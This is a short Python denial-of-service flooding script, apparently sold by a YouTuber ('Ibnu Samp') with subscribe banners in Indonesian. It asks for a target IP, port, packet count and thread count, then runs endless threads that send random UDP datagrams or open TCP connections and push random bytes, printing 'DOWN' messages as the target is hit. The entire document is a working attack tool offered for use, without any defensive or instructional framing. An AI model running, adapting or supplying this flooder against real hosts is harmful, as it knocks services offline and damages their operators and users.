"DI JUAL 10K"
"BY : Ibnu Samp"
"JANGAN LUPA SUBSCRIBE YA"

import random
import socket
import threading

print("\033[92m")
print("""
    Tools by:

YT Ibnu Samp

""")
print("\033[97m")
ip= str(input(" ip mas :"))
port= int(input(" port mas :"))
choice = str(input(" Ddos Attack ga mas?? (y/n):"))
times= int(input(" Paket mas :"))
threads= int(input(" threads :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" SUBSCRIBE YT Ibnu Samp!!!")
		except:
			print("[!] HMM DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" SUBSCRIBE YT Ibnu Samp!!!")
		except:
			s.close()
			print("[*] HMMM DOWN!!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
